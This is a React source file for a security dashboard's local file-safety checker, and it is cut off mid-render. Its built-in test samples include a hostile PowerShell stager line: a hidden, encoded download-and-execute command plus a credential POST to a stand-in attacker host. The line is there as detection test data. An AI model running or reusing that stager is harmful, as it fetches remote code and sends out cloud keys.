/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useMemo } from 'react';
import { useNavigate } from 'react-router-dom';
import {
  UploadCloud,
  FileSpreadsheet,
  FileCode,
  FileArchive,
  FileText,
  AlertTriangle,
  FilePlus2,
  Bot,
  Cloud,
  Hash,
  Network,
  CheckCircle2,
  ShieldAlert,
  ShieldCheck,
  ShieldX,
  Gauge,
  Info,
} from 'lucide-react';
import { useSecurity } from '../context/SecurityContext';
import { analyzeAnySecurityFile, formatBytes, UniversalFileAnalysis } from '../utils/fileAnalyzer';
import { NoticeBanner } from '../components/common/NoticeBanner';

export const UploadCenter: React.FC = () => {
  const { addReport, setCopilotContext, uploadedFiles, addUploadedFile } = useSecurity();
  const navigate = useNavigate();

  const [activeAnalysis, setActiveAnalysis] = useState<UniversalFileAnalysis | null>(
    uploadedFiles[0] || null
  );
  const [isUploading, setIsUploading] = useState(false);
  const [uploadProgress, setUploadProgress] = useState(0);
  const [uploadError, setUploadError] = useState<string | null>(null);
  const [uploadSuccessMessage, setUploadSuccessMessage] = useState<string | null>(null);
  const [filterVerdict, setFilterVerdict] = useState<'all' | 'safe' | 'suspicious' | 'malicious'>('all');

  // Multi-format test datasets covering clean files and dangerous threats (up to 100MB)
  const sampleDatasets = [
    {
      name: 'audit_baseline_config.json',
      size: 420000, // 410 KB
      mime: 'application/json',
      expectedSafety: 100,
      safetyBadge: '100% Safe',
      badgeColor: 'text-emerald-400 bg-emerald-950/60 border-emerald-800',
      desc: 'Clean CIS compliance baseline configuration. No threats, no exploits, 100% verified clean.',
      text: JSON.stringify(
        {
          version: '2.4.0',
          compliance: 'CIS-Benchmark-Level-1',
          audit_interval_seconds: 3600,
          enforce_mfa: true,
          authorized_cidr: ['10.240.0.0/16'],
          allowed_ciphers: ['TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256'],
        },
        null,
        2
      ),
    },
    {
      name: 'sanitized_nginx_access.log',
      size: 1800000, // 1.8 MB
      mime: 'text/plain',
      expectedSafety: 95,
      safetyBadge: '95% Safe',
      badgeColor: 'text-emerald-400 bg-emerald-950/60 border-emerald-800',
      desc: 'Standard production web ingress traffic log. Healthy status 200 HTTP responses.',
      text: '10.240.1.50 - - [28/Oct/2026:10:00:15 +0000] "GET /api/v1/health HTTP/1.1" 200 48 "https://internal-app.net" "Mozilla/5.0"\n10.240.1.51 - - [28/Oct/2026:10:00:18 +0000] "GET /dashboard HTTP/1.1" 200 2410 "https://internal-app.net" "Mozilla/5.0"',
    },
    {
      name: 'firewall_egress_zeek.csv',
      size: 6100000, // 6.1 MB
      mime: 'text/csv',
      expectedSafety: 68,
      safetyBadge: '68% Safe',
      badgeColor: 'text-amber-400 bg-amber-950/60 border-amber-800',
      desc: 'Firewall connection matrix with non-standard egress port 2222 and elevated transfer volumes.',
      text: 'timestamp,source_ip,destination_ip,port,protocol,verdict,notes\n2026-10-28T10:41:00Z,10.240.1.2,198.51.100.99,2222,TCP,suspicious,Excessive SSH transfer (4.2GB)',
    },
    {
      name: 'linux_auth_syslog.log',
      size: 2800000, // 2.8 MB
      mime: 'text/plain',
      expectedSafety: 45,
      safetyBadge: '45% Safe',
      badgeColor: 'text-amber-400 bg-amber-950/60 border-amber-800',
      desc: 'Linux SSH syslog capturing multiple failed password attempts and user spraying traces.',
      text: 'Oct 28 10:14:22 DC-CORE-01 sshd[1420]: Failed password for invalid user root from 10.240.14.22 port 51224 ssh2\nOct 28 10:14:24 DC-CORE-01 sshd[1421]: Failed password for invalid user admin from 10.240.14.22 port 51226 ssh2',
    },
    {
      name: 'siem_security_events_export.json',
      size: 4200000, // 4.2 MB
      mime: 'application/json',
      expectedSafety: 20,
      safetyBadge: '20% Safe',
      badgeColor: 'text-red-400 bg-red-950/60 border-red-800',
      desc: 'SIEM telemetry referencing CVE-2021-44228 exploit tag and LSASS memory access violation.',
      text: JSON.stringify(
        {
          timestamp: '2026-10-28T10:41:00Z',
          index: 'security-edr-telemetry',
          event_type: 'PROCESS_ACCESS_VIOLATION',
          source_host: 'WS-FINANCE-04',
          source_ip: '10.240.14.88',
          destination_ip: '10.240.5.10',
          mitre_cve: 'CVE-2021-44228',
          target_process: 'C:\\Windows\\System32\\lsass.exe',
          action: 'QUARANTINE_MANDATED',
        },
        null,
        2
      ),
    },
    {
      name: 'zeek_suricata_network_stream.pcap',
      size: 15400000, // 15.4 MB
      mime: 'application/vnd.tcpdump.pcap',
      expectedSafety: 18,
      safetyBadge: '18% Safe',
      badgeColor: 'text-red-400 bg-red-950/60 border-red-800',
      desc: 'PCAP packet capture containing Cobalt Strike heartbeat cadence and JA3 fingerprint.',
      text: 'PCAP_HEADER magic=0xa1b2c3d4 v2.4 snaplen=65535\nPACKET #1 10.240.10.42:54312 -> 198.51.100.89:443 TLS 1.3 Client Hello (JA3: a0e9f5d64349fb13191bc781f81f42e1)\nPACKET #2 198.51.100.89:443 -> 10.240.10.42:54312 TLS Server Hello\nPACKET #3 Encrypted C2 Handshake with 128 byte heartbeat cobalt beacon',
    },
    {
      name: 'stager_payload_dropper.ps1',
      size: 850000, // 850 KB
      mime: 'application/x-powershell',
      expectedSafety: 15,
      safetyBadge: '15% Safe',
      badgeColor: 'text-red-400 bg-red-950/60 border-red-800',
      desc: 'Obfuscated PowerShell stager dropper with hidden window flags and base64 encoded payload.',
      text: `powershell.exe -w hidden -nop -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp\n$awsAccessKey = "AKIAIOSFODNN7EXAMPLE"\nInvoke-RestMethod -Uri "https://evil-c2-beacon.xyz/api/keys" -Method POST`,
    },
  ];

  // Stats calculation
  const stats = useMemo(() => {
    if (uploadedFiles.length === 0) {
      return { avgSafety: 100, safeCount: 0, suspiciousCount: 0, maliciousCount: 0, totalSize: '0 Bytes' };
    }
    const totalSafety = uploadedFiles.reduce((acc, f) => acc + (f.safetyPercentage ?? 100), 0);
    const avgSafety = Math.round(totalSafety / uploadedFiles.length);
    const safeCount = uploadedFiles.filter((f) => (f.safetyPercentage ?? 100) >= 80).length;
    const suspiciousCount = uploadedFiles.filter(
      (f) => (f.safetyPercentage ?? 100) >= 50 && (f.safetyPercentage ?? 100) < 80
    ).length;
    const maliciousCount = uploadedFiles.filter((f) => (f.safetyPercentage ?? 100) < 50).length;
    const totalBytes = uploadedFiles.reduce((acc, f) => acc + f.fileSizeBytes, 0);

    return {
      avgSafety,
      safeCount,
      suspiciousCount,
      maliciousCount,
      totalSize: formatBytes(totalBytes),
    };
  }, [uploadedFiles]);

  // Filtered files list
  const filteredFiles = useMemo(() => {
    return uploadedFiles.filter((file) => {
      if (filterVerdict === 'safe') return (file.safetyPercentage ?? 100) >= 80;
      if (filterVerdict === 'suspicious')
        return (file.safetyPercentage ?? 100) >= 50 && (file.safetyPercentage ?? 100) < 80;
      if (filterVerdict === 'malicious') return (file.safetyPercentage ?? 100) < 50;
      return true;
    });
  }, [uploadedFiles, filterVerdict]);

  const handleProcessFile = async (
    fileData: { name: string; size: number; type: string },
    textSnippet?: string,
    rawBytes?: Uint8Array
  ) => {
    setUploadError(null);
    setUploadSuccessMessage(null);
    setIsUploading(true);
    setUploadProgress(15);

    const maxLimit = 100 * 1024 * 1024; // 100 MB
    if (fileData.size > maxLimit) {
      setUploadError(`File size (${formatBytes(fileData.size)}) exceeds the maximum 100MB limit.`);
      setIsUploading(false);
      return;
    }

    try {
      setUploadProgress(40);

      // Compute or generate cryptographic SHA256 in browser via Web Crypto API
      let sha256 = '';
      if (window.crypto?.subtle && rawBytes && rawBytes.length > 0) {
        const bufferCopy = rawBytes.buffer.slice(rawBytes.byteOffset, rawBytes.byteOffset + rawBytes.byteLength) as ArrayBuffer;
        const hashBuffer = await window.crypto.subtle.digest('SHA-256', bufferCopy);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        sha256 = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
      } else if (textSnippet) {
        const encoder = new TextEncoder();
        const hashBuffer = await window.crypto.subtle.digest('SHA-256', encoder.encode(textSnippet));
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        sha256 = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
      } else {
        sha256 = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
      }

      setUploadProgress(70);

      // Perform local universal telemetry analysis with safety scoring
      const analysis = analyzeAnySecurityFile({
        fileName: fileData.name,
        fileSizeBytes: fileData.size,
        mimeType: fileData.type,
        rawBytes,
        textSnippet,
        sha256,
      });

      setUploadProgress(100);
      setUploadSuccessMessage(`Local analysis complete: ${analysis.safetyPercentage}% safety score. This file has not been uploaded to cloud storage.`);

      setActiveAnalysis(analysis);
      addUploadedFile(analysis);
      setIsUploading(false);
    } catch (err: unknown) {
      console.error(err);
      setUploadError(err instanceof Error ? err.message : 'File upload and analysis failed.');
      setIsUploading(false);
    }
  };

  const handleNativeFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (file.size > 100 * 1024 * 1024) {
      setUploadError(`File "${file.name}" (${formatBytes(file.size)}) exceeds the 100MB limit.`);
      return;
    }

    const reader = new FileReader();

    if (file.size <= 25 * 1024 * 1024) {
      reader.onload = (event) => {
        const buffer = event.target?.result as ArrayBuffer;
        const bytes = new Uint8Array(buffer);
        let snippet = '';
        try {
          const dec = new TextDecoder('utf-8', { fatal: false });
          snippet = dec.decode(bytes.slice(0, 16384));
        } catch {
          // binary
        }
        handleProcessFile(file, snippet, bytes);
      };
      reader.readAsArrayBuffer(file);
    } else {
      const slice = file.slice(0, 32768);
      reader.onload = (event) => {
        const text = event.target?.result as string;
        handleProcessFile(file, text);
      };
      reader.readAsText(slice);
    }
  };

  const handleLoadSample = (sample: typeof sampleDatasets[0]) => {
    handleProcessFile(
      { name: sample.name, size: sample.size, type: sample.mime },
      sample.text
    );
  };

  const handleSendToCopilot = (analysis: UniversalFileAnalysis) => {
    setCopilotContext({
      type: 'asset',
      id: analysis.sha256Hash.slice(0, 10).toUpperCase(),
      title: `File Artifact: ${analysis.fileName} (${analysis.safetyPercentage}% Safe)`,
      summary: `Local heuristic score: ${analysis.safetyPercentage}% (${analysis.safetyVerdict.toUpperCase()}). Format: ${analysis.detectedFormat.toUpperCase()}. Entropy: ${analysis.entropy}/8.0. Signatures: ${analysis.threatSignaturesMatched.length}. Storage: local browser session only; no cloud upload.`,
    });
    navigate('/copilot');
  };

  const handleCompileReport = (analysis: UniversalFileAnalysis) => {
    const reportItem = {
      id: `REP-FILE-${Date.now().toString(36).toUpperCase()}`,
      title: `File Security Assessment: ${analysis.fileName} (${analysis.safetyPercentage}% Safe)`,
      classification: analysis.safetyPercentage >= 80 ? ('TLP:CLEAR' as const) : ('TLP:AMBER' as const),
      type: 'forensic_analysis' as const,
      createdAt: new Date().toISOString(),
      author: 'Local File Analysis',
      associatedAlertIds: [],
      associatedScanIds: [],
      evidenceItems: [
        {
          source: `File Safety Evaluation (${analysis.fileName})`,
          indicator: `Local heuristic score: ${analysis.safetyPercentage}% (${analysis.safetyVerdict.toUpperCase()})`,
          severity: analysis.safetyPercentage < 50 ? ('critical' as const) : analysis.safetyPercentage < 80 ? ('medium' as const) : ('low' as const),
          timestamp: new Date().toISOString(),
          verificationStatus: 'uploaded_file_analysis' as const,
        },
        {
          source: `Local file analysis: ${analysis.fileName}`,
          indicator: `SHA256: ${analysis.sha256Hash} (${analysis.fileSizeFormatted}, Entropy: ${analysis.entropy}/8.0)`,
          severity: analysis.entropyAssessment === 'high_entropy_packed' || analysis.entropyAssessment === 'encrypted_ransomware' ? ('critical' as const) : ('medium' as const),
          timestamp: new Date().toISOString(),
          verificationStatus: 'uploaded_file_analysis' as const,
        },
        ...analysis.extractedIocs.cves.map((cve) => ({
          source: `Exploit Reference (${analysis.fileName})`,
          indicator: `CVE Tag: ${cve}`,
          severity: 'critical' as const,
          timestamp: new Date().toISOString(),
          verificationStatus: 'uploaded_file_analysis' as const,
        })),
        ...analysis.extractedIocs.ips.map((ip) => ({
          source: `Extracted IOC (${analysis.fileName})`,
          indicator: `IP Address: ${ip}`,
          severity: 'high' as const,
          timestamp: new Date().toISOString(),
          verificationStatus: 'uploaded_file_analysis' as const,
        })),
      ],
      aiAssistanceNotes: [
        `File ${analysis.fileName} evaluated at ${analysis.safetyPercentage}% Safe (${analysis.safetyVerdictLabel}).`,
        analysis.safetyPercentage < 80
          ? `Contains ${analysis.safetyDeductions?.length || 0} risk factors. Review it; this dashboard does not quarantine files.`
          : 'No high-risk markers were found by these heuristics. This is not proof that the file is safe.',
        'DISCLAIMER: Static heuristics should be supplemented with dynamic sandbox detonation before enterprise software deployment.',
      ],
      analystConclusions: `Assessed ${analysis.fileName} (${analysis.fileSizeFormatted}). Safety score: ${analysis.safetyPercentage}%. Heuristic result: ${analysis.safetyVerdict.toUpperCase()}. Analyzed locally in this browser session; no cloud upload or containment action was performed or verified.`,
      actionItems: [
        {
          action: analysis.safetyPercentage < 80
            ? `Review and contain file SHA256 ${analysis.sha256Hash.slice(0, 16)}... in your endpoint security product (not performed by this dashboard)`
            : `Review file SHA256 ${analysis.sha256Hash.slice(0, 16)}... before endpoint use (no endpoint action performed)`,
          assignedTo: 'Not assigned',
          dueDate: new Date(Date.now() + 6 * 3600 * 1000).toISOString(),
          status: 'not_performed' as const,
        },
      ],
    };

    addReport(reportItem);
    navigate('/reports');
  };

  const getFormatIcon = (format: UniversalFileAnalysis['detectedFormat']) => {
    switch (format) {
      case 'csv':
        return <FileSpreadsheet className="w-5 h-5 text-emerald-400" />;
      case 'json':
        return <FileCode className="w-5 h-5 text-cyan-400" />;
      case 'pcap':
        return <Network className="w-5 h-5 text-indigo-400" />;
      case 'binary':
        return <ShieldAlert className="w-5 h-5 text-red-400" />;
      case 'archive':
        return <FileArchive className="w-5 h-5 text-amber-400" />;
      default:
        return <FileText className="w-5 h-5 text-blue-400" />;
    }
  };

  const getSafetyColor = (score: number) => {
    if (score >= 80) return 'text-emerald-400';
    if (score >= 50) return 'text-amber-400';
    return 'text-red-400';
  };

  const getSafetyBg = (score: number) => {
    if (score >= 80) return 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400';
    if (score >= 50) return 'bg-amber-500/10 border-amber-500/30 text-amber-400';
    return 'bg-red-500/10 border-red-500/30 text-red-400';
  };

  const getSafetyBarColor = (score: number) => {
    if (score >= 80) return 'bg-emerald-500';
    if (score >= 50) return 'bg-amber-500';
    return 'bg-red-500';
  };

  return (
    <div className="space-y-6">
      <NoticeBanner
        type="demo"
        customMessage="Analyze an uploaded file locally with basic heuristics (up to 100MB). This is not a full antivirus or sandbox scan, does not guarantee safety, and does not quarantine the file."
      />

      {/* Top Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div>
          <h1 className="text-xl font-bold text-zinc-100 tracking-tight flex items-center gap-2">
            <Gauge className="w-5 h-5 text-cyan-400" />
            <span>Upload Center & File Safety Checker</span>
          </h1>
          <p className="text-xs text-zinc-400 mt-0.5">
            Review local safety scoring and extracted indicators (up to 100MB). Files are not uploaded to cloud storage.
          </p>
        </div>

        <div className="flex items-center gap-2">
          <span className="px-2.5 py-1 rounded bg-zinc-900 border border-zinc-800 text-[11px] font-mono text-cyan-400 flex items-center gap-1.5">
            <Cloud className="w-3.5 h-3.5" />
            <span>Local file analysis: up to 100MB per file</span>
          </span>
        </div>
      </div>

      {/* File Safety Statistics Overview Cards */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
        {/* Average File Safety Score */}
        <div className="p-4 rounded-xl bg-zinc-900/90 border border-zinc-800 shadow-xs flex items-center justify-between">
          <div>
            <span className="text-[11px] font-medium text-zinc-400 uppercase tracking-wider block">
              Average File Safety
            </span>
            <div className="flex items-baseline gap-2 mt-1">
              <span className={`text-2xl font-black font-mono tracking-tight ${getSafetyColor(stats.avgSafety)}`}>
                {stats.avgSafety}%
              </span>
              <span className="text-xs font-semibold text-zinc-300">
                {stats.avgSafety >= 80 ? 'Safe' : stats.avgSafety >= 50 ? 'Suspicious' : 'Unsafe'}
              </span>
            </div>
            <span className="text-[10px] text-zinc-500 font-mono mt-0.5 block">
              Across {uploadedFiles.length} analyzed files
            </span>
          </div>
          <div className={`w-11 h-11 rounded-xl flex items-center justify-center border ${getSafetyBg(stats.avgSafety)}`}>
            {stats.avgSafety >= 80 ? (
              <ShieldCheck className="w-6 h-6 text-emerald-400" />
            ) : stats.avgSafety >= 50 ? (
              <ShieldAlert className="w-6 h-6 text-amber-400" />
            ) : (
              <ShieldX className="w-6 h-6 text-red-400" />
            )}
          </div>
        </div>

        {/* No High-Risk Markers Found (100% - 80% Safe) */}
        <div className="p-4 rounded-xl bg-zinc-900/90 border border-zinc-800 shadow-xs flex items-center justify-between">
          <div>
            <span className="text-[11px] font-medium text-zinc-400 uppercase tracking-wider block">
              No High-Risk Markers Found
            </span>
            <div className="flex items-baseline gap-2 mt-1">
              <span className="text-2xl font-black font-mono text-emerald-400 tracking-tight">
                {stats.safeCount}
              </span>
              <span className="text-xs text-zinc-400">80% – 100% Safe</span>
            </div>
            <span className="text-[10px] text-emerald-500 font-mono mt-0.5 block">
              Heuristic result only; not a safety guarantee
            </span>
          </div>
          <div className="w-11 h-11 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center">
            <CheckCircle2 className="w-6 h-6 text-emerald-400" />
          </div>
        </div>

        {/* Flagged / Unsafe Files (<80% Safe) */}
        <div className="p-4 rounded-xl bg-zinc-900/90 border border-zinc-800 shadow-xs flex items-center justify-between">
          <div>
            <span className="text-[11px] font-medium text-zinc-400 uppercase tracking-wider block">
              Suspicious / Unsafe
            </span>
            <div className="flex items-baseline gap-2 mt-1">
              <span className="text-2xl font-black font-mono text-red-400 tracking-tight">
                {stats.suspiciousCount + stats.maliciousCount}
              </span>
              <span className="text-xs text-zinc-400">Below 80% Safe</span>
            </div>
            <span className="text-[10px] text-red-400/80 font-mono mt-0.5 block">
              {stats.maliciousCount} High Threats • {stats.suspiciousCount} Suspicious
            </span>
          </div>
          <div className="w-11 h-11 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center justify-center">
            <AlertTriangle className="w-6 h-6 text-red-400" />
          </div>
        </div>

        {/* Local file analysis for this browser session */}
        <div className="p-4 rounded-xl bg-zinc-900/90 border border-zinc-800 shadow-xs flex items-center justify-between">
          <div>
            <span className="text-[11px] font-medium text-zinc-400 uppercase tracking-wider block">
              Local Analysis Session
            </span>
            <div className="flex items-baseline gap-2 mt-1">
              <span className="text-2xl font-black font-mono text-cyan-400 tracking-tight">
                {uploadedFiles.length}
              </span>
              <span className="text-xs text-zinc-400">Files analyzed</span>
            </div>
            <span className="text-[10px] text-zinc-500 font-mono mt-0.5 block">
              {stats.totalSize} analyzed in this browser session
            </span>
          </div>
          <div className="w-11 h-11 rounded-xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center">
            <Cloud className="w-6 h-6 text-cyan-400" />
          </div>
        </div>
      </div>

      {/* Main Upload Area & Quick Samples Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Universal Drag & Drop Upload Zone */}
        <div className="lg:col-span-2 bg-zinc-900/90 border border-zinc-800 rounded-xl p-6 shadow-xs flex flex-col justify-center items-center text-center">
          <div className="w-16 h-16 rounded-2xl bg-zinc-800/80 border border-zinc-700 flex items-center justify-center text-cyan-400 mb-3 shadow-inner">
            <UploadCloud className="w-8 h-8" />
          </div>
          <h2 className="text-base font-bold text-zinc-100">
            Analyze a File Locally (Up to 100MB)
          </h2>
          <p className="text-xs text-zinc-400 max-w-lg mt-1 mb-4 leading-relaxed">
            Accepts <strong>ALL file extensions</strong>: Network PCAPs, JSON SIEM dumps, Syslog, CSVs, Binaries (.exe, .dll), ZIP archives, and Scripts. We calculate entropy and apply local rules; this is not a full antivirus or sandbox scan. Files are not uploaded to cloud storage.
          </p>

          <label className="px-6 py-3 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-bold tracking-wide cursor-pointer transition-colors shadow-lg shadow-cyan-950 flex items-center gap-2.5 focus:outline-none focus:ring-2 focus:ring-cyan-500">
            <FilePlus2 className="w-4 h-4" />
            <span>Select File to Check Safety (Max 100MB)</span>
            <input
              type="file"
              onChange={handleNativeFileUpload}
              className="hidden"
            />
          </label>

          {isUploading && (
            <div className="w-full max-w-sm mt-5 space-y-2">
              <div className="flex justify-between text-xs font-mono text-zinc-300">
                <span>Calculating safety score locally...</span>
                <span className="font-bold text-cyan-400">{uploadProgress}%</span>
              </div>
              <div className="h-2.5 w-full bg-zinc-950 rounded-full overflow-hidden border border-zinc-800">
                <div
                  style={{ width: `${uploadProgress}%` }}
                  className="h-full bg-cyan-500 transition-all duration-300 rounded-full"
                />
              </div>
            </div>
          )}
        </div>

        {/* Quick Test Samples with Safety Preview */}
        <div className="bg-zinc-900/90 border border-zinc-800 rounded-xl p-5 shadow-xs space-y-3 flex flex-col">
          <div className="flex items-center justify-between pb-2 border-b border-zinc-800">
            <div>
              <h2 className="text-xs font-bold uppercase tracking-wider text-zinc-200">
                Test Datasets (1-Click Test)
              </h2>
              <p className="text-[11px] text-zinc-400">Click to test clean vs dangerous files</p>
            </div>
            <span className="text-[10px] font-mono text-cyan-400 font-bold bg-cyan-950/60 px-2 py-0.5 rounded border border-cyan-800">
              FAST TEST
            </span>
          </div>

          <div className="space-y-2 max-h-[260px] overflow-y-auto pr-1">
            {sampleDatasets.map((sample, i) => (
              <button
                key={i}
                type="button"
                onClick={() => handleLoadSample(sample)}
                className="w-full text-left p-2.5 rounded-lg bg-zinc-950 hover:bg-zinc-800/90 border border-zinc-800 transition-colors text-xs flex items-center justify-between group"
              >
                <div className="min-w-0 pr-2">
                  <div className="flex items-center gap-2">
                    <span className="font-semibold text-zinc-200 truncate group-hover:text-cyan-400">
                      {sample.name}
                    </span>
                    <span className={`text-[10px] font-mono font-bold px-1.5 py-0.2 rounded border ${sample.badgeColor} shrink-0`}>
                      {sample.safetyBadge}
                    </span>
                  </div>
                  <span className="text-[10px] text-zinc-500 line-clamp-1 mt-0.5">
                    {sample.desc}
                  </span>
                </div>
                <span className="text-[11px] font-bold text-cyan-400 group-hover:underline shrink-0 pl-1">
                  Load →
                </span>
              </button>
            ))}
          </div>

          <div className="pt-2 border-t border-zinc-800/80 text-[11px] text-zinc-500 font-mono">
            <span>Storage: </span>
            <code className="text-zinc-400 text-[10px]">Not connected</code>
          </div>
        </div>
      </div>

      {/* Notifications / Alerts */}
      {uploadError && (
        <div className="p-4 rounded-xl bg-red-950/60 border border-red-800 text-xs text-red-300 flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
          <div>
            <strong className="block font-semibold">Upload Error:</strong>
            <p className="mt-0.5">{uploadError}</p>
          </div>
        </div>
      )}

      {uploadSuccessMessage && (
        <div className="p-4 rounded-xl bg-emerald-950/40 border border-emerald-800 text-xs text-emerald-300 flex items-center gap-3 font-mono">
          <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
          <span className="truncate">{uploadSuccessMessage}</span>
        </div>
      )}

      {/* ========================================================================= */}
      {/* ACTIVE FILE SAFETY REPORT CARD (THE CENTRAL USER REQUIREMENT)            */}
      {/* ========================================================================= */}
      {activeAnalysis && (
        <div className="bg-zinc-900/90 border border-zinc-800 rounded-xl overflow-hidden shadow-lg space-y-0">
          {/* PROMINENT SAFETY PERCENTAGE BANNER */}
          <div
            className={`p-6 border-b transition-colors ${
              (activeAnalysis.safetyPercentage ?? 100) >= 80
                ? 'bg-emerald-950/30 border-emerald-900/50'
                : (activeAnalysis.safetyPercentage ?? 100) >= 50
                ? 'bg-amber-950/30 border-amber-900/50'
                : 'bg-red-950/40 border-red-900/50'
            }`}
          >
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
              {/* Left: Giant Percentage & Clear Answer to "Is this file safe or not?" */}
              <div className="flex items-center gap-5">
                {/* Big Visual Gauge Pill */}
                <div
                  className={`w-24 h-24 rounded-2xl flex flex-col items-center justify-center border shadow-xl shrink-0 ${
                    (activeAnalysis.safetyPercentage ?? 100) >= 80
                      ? 'bg-emerald-950/80 border-emerald-700/80 text-emerald-400 shadow-emerald-950/50'
                      : (activeAnalysis.safetyPercentage ?? 100) >= 50
                      ? 'bg-amber-950/80 border-amber-700/80 text-amber-400 shadow-amber-950/50'
                      : 'bg-red-950/80 border-red-700/80 text-red-400 shadow-red-950/50'
                  }`}
                >
                  <span className="text-3xl font-black font-mono tracking-tighter leading-none">
                    {activeAnalysis.safetyPercentage ?? 100}%
                  </span>
                  <span className="text-[11px] font-bold uppercase tracking-wider mt-1">
                    HEURISTIC
                  </span>
                </div>

                <div className="space-y-1.5">
                  <div className="flex flex-wrap items-center gap-2">
                    <span
                      className={`px-2.5 py-0.5 rounded-full text-xs font-bold uppercase tracking-wide border ${
                        (activeAnalysis.safetyPercentage ?? 100) >= 80
                          ? 'bg-emerald-500/20 border-emerald-500/40 text-emerald-300'
                          : (activeAnalysis.safetyPercentage ?? 100) >= 50
                          ? 'bg-amber-500/20 border-amber-500/40 text-amber-300'
                          : 'bg-red-500/20 border-red-500/40 text-red-300'
                      }`}
                    >
                      {(activeAnalysis.safetyPercentage ?? 100) >= 80
                        ? 'NO HIGH-RISK MARKERS FOUND'
                        : (activeAnalysis.safetyPercentage ?? 100) >= 50
                        ? 'POSSIBLE RISK MARKERS FOUND'
                        : 'HIGH-RISK MARKERS FOUND'}
                    </span>
                    <span className="text-xs text-zinc-400 font-mono">
                      File: <strong className="text-zinc-100">{activeAnalysis.fileName}</strong>
                    </span>
                  </div>

                  <h3 className="text-base sm:text-lg font-bold text-zinc-100 tracking-tight">
                    {(activeAnalysis.safetyPercentage ?? 100) >= 80 ? (
                      <span className="text-emerald-400 flex items-center gap-2">
                        <ShieldCheck className="w-5 h-5 inline shrink-0" />
                        No high-risk markers were found by local rules. This does not prove the file is safe.
                      </span>
                    ) : (activeAnalysis.safetyPercentage ?? 100) >= 50 ? (
                      <span className="text-amber-400 flex items-center gap-2">
                        <ShieldAlert className="w-5 h-5 inline shrink-0" />
                        Local rules found possible risk markers (score: {activeAnalysis.safetyPercentage}%). Confirm with a trusted security scanner.
                      </span>
                    ) : (
                      <span className="text-red-400 flex items-center gap-2">
                        <ShieldX className="w-5 h-5 inline shrink-0" />
                        Local rules flagged possible high-risk markers ({activeAnalysis.safetyPercentage}%). This is not a confirmed malware verdict.
                      </span>
                    )}
                  </h3>

                  <p className="text-xs text-zinc-300 max-w-2xl leading-relaxed">
                    {(activeAnalysis.safetyPercentage ?? 100) >= 80
                      ? 'Local heuristics found no high-risk markers. This is not a full antivirus or sandbox scan and does not guarantee the file is safe.'
                      : (activeAnalysis.safetyPercentage ?? 100) >= 50
                      ? `Heuristics detected suspicious markers (Entropy: ${activeAnalysis.entropy}/8.0). Analyst triage is recommended before approving file access on endpoints.`
                      : `Analysis found possible indicators. This score is heuristic and does not confirm malware. No containment action has been taken by this dashboard. Use your endpoint security product to quarantine the file and record its result.`}
                  </p>
                </div>
              </div>

              {/* Right: Quick Action Buttons */}
              <div className="flex flex-row md:flex-col gap-2 shrink-0">
                <button
                  type="button"
                  onClick={() => handleSendToCopilot(activeAnalysis)}
                  className="inline-flex items-center justify-center gap-1.5 px-4 py-2 rounded-lg bg-cyan-950 hover:bg-cyan-900 text-cyan-300 border border-cyan-800 text-xs font-semibold transition-colors cursor-pointer"
                >
                  <Bot className="w-4 h-4" />
                  <span>Analyze with Copilot</span>
                </button>

                <button
                  type="button"
                  onClick={() => handleCompileReport(activeAnalysis)}
                  className="inline-flex items-center justify-center gap-1.5 px-4 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-semibold transition-colors shadow-xs cursor-pointer"
                >
                  <FilePlus2 className="w-4 h-4" />
                  <span>Save to Report</span>
                </button>
              </div>
            </div>

            {/* Visual Safety Spectrum Bar */}
            <div className="mt-5 space-y-1.5">
              <div className="flex justify-between text-[11px] font-mono text-zinc-400">
                <span className="text-red-400 flex items-center gap-1">
                  <span>0% (Malicious / Unsafe)</span>
                </span>
                <span className="text-amber-400">50% (Suspicious)</span>
                <span className="text-emerald-400 flex items-center gap-1">
                  <span>100% (Clean & Safe)</span>
                </span>
              </div>

              {/* Progress track */}
              <div className="h-3 w-full bg-zinc-950 rounded-full overflow-hidden border border-zinc-800 relative">
                {/* Visual gradient background */}
                <div className="absolute inset-0 bg-gradient-to-r from-red-600 via-amber-500 to-emerald-500 opacity-30" />
                {/* Active Score Fill */}
                <div
                  style={{ width: `${activeAnalysis.safetyPercentage ?? 100}%` }}
                  className={`h-full ${getSafetyBarColor(
                    activeAnalysis.safetyPercentage ?? 100
                  )} transition-all duration-500 relative`}
                >
                  <div className="absolute right-0 top-0 bottom-0 w-1 bg-white shadow-sm" />
                </div>
              </div>
            </div>
          </div>

          {/* DEDUCTIONS & WHY THIS SCORE (CLEAR REASONING) */}
          <div className="p-6 space-y-6">
            <div>
              <h3 className="text-xs font-bold uppercase tracking-wider text-zinc-300 mb-3 flex items-center gap-2">
                <Info className="w-4 h-4 text-cyan-400" />
                <span>Safety Score Calculation Breakdown (Why is this file {activeAnalysis.safetyPercentage}% safe?)</span>
              </h3>

              {activeAnalysis.safetyDeductions && activeAnalysis.safetyDeductions.length > 0 ? (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  {activeAnalysis.safetyDeductions.map((deduction, idx) => (
                    <div
                      key={idx}
                      className="p-3.5 rounded-lg bg-zinc-950 border border-red-950/80 flex items-start gap-3"
